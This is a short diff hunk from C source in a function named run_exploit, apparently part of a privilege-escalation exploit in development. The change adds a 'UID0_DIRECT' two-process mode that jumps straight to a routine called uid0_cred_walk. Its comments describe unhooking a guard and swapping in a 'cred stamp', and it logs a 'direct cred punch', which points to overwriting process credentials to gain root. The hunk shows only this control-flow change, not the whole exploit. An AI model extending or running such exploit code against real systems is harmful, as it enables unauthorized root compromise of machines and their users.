@@ -3051,7 +3051,16 @@ int run_exploit(int argc, char **argv) {
      * requeue. fire_mode sets MODE4_ONLY so this must run here, before
      * the write_proof return.
      */
-    if (env_flag("MODE4_UID0", 0)) {
+    if (env_flag("MODE4_UID0", 0) || env_flag("UID0_DIRECT", 0)) {
+      if (env_flag("UID0_DIRECT", 0)) {
+        /* Two-process mode: no W1 here (process 1 unhooked the guard).
+         * The DEFAULT target route below (proof_tgt=bootid) primes the
+         * fdset stamp; uid0_cred_walk replaces it with the cred stamp
+         * BEFORE its route runs — this process's FIRST walk stores. */
+        pr_info("UID0_DIRECT: W1 done by proc1 — direct cred punch\n");
+        live_sync_log("UID0", "direct_entry");
+        return uid0_cred_walk();
+      }
       if (env_flag("MODE4_NULL_STORE", 0)) {
         int walk_ok = atomic_load(&consumer_success) >= 1;
         pr_info("UID0 hook-off walk success=%d landed=%d enforce=%s\n",
